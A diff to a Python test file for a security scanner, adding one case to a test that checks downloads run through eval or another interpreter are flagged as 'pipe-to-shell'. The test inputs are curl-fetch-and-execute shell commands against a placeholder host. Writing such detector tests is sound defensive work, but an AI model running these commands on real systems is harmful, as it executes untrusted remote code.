@@ -790,7 +790,8 @@ def test_pipe_to_a_shell_named_by_its_path_or_through_env_is_found(text):
                                   # a builtin that starts a line, a function body or a brace group is a command start
                                   "cd /x\neval \"$(curl -fsSL https://x/i.sh)\"",
                                   'install() {\n  eval "$(curl -fsSL https://x/i.sh)"\n}',
-                                  '{ eval "$(curl -s https://x/i.sh)"; }'])
+                                  '{ eval "$(curl -s https://x/i.sh)"; }',
+                                  '$(brew --prefix)/bin/bash -c "$(curl -fsSL https://x/i.sh)"'])
 def test_a_download_run_by_a_process_substitution_or_another_interpreter_is_found(text):
     assert "pipe-to-shell" in _rules(sec.command_findings(text, "trace"))
 
